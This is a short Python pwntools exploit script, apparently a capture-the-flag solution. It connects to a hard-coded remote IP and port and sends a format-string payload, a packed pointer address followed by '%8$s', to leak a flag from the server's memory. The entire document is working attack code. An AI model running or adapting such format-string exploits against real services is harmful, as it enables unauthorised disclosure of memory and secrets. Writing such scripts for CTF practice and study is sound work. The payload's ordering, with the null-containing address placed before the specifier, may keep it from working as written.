#!/usr/bin/env python3
from pwn import *

# Remote server details
HOST = "13.124.117.173"
PORT = 10314

# Address of flag_ptr (from analysis)
FLAG_PTR_ADDR = 0x404050

# Craft the payload
# - Place the flag_ptr address at the start of the input
# - Use %8$s to dereference the 8th stack position
payload = (
    p64(FLAG_PTR_ADDR) +  # 0x404050 in 64-bit little-endian
    b" %8$s"              # Format string to leak the flag
)

def exploit():
    # Connect to the remote server
    p = remote(HOST, PORT)
    
    # Receive and print the initial prompt
    print(p.recvn(1024).decode(), end="")
    
    # Send the payload
    p.sendline(payload)
    
    # Receive and print the response
    response = p.recvn(1024).decode()
    print(response, end="")
    
    # Extract the flag
    if "flag{" in response:
        flag = response.split("You entered: ")[1].strip()
        print(f"\n[+] Flag: {flag}")
    else:
        print("\n[-] Flag not found in response.")
    
    # Close the connection
    p.close()

if __name__ == "__main__":
    # Set pwntools context for 64-bit
    context(arch="amd64", os="linux")
    exploit()

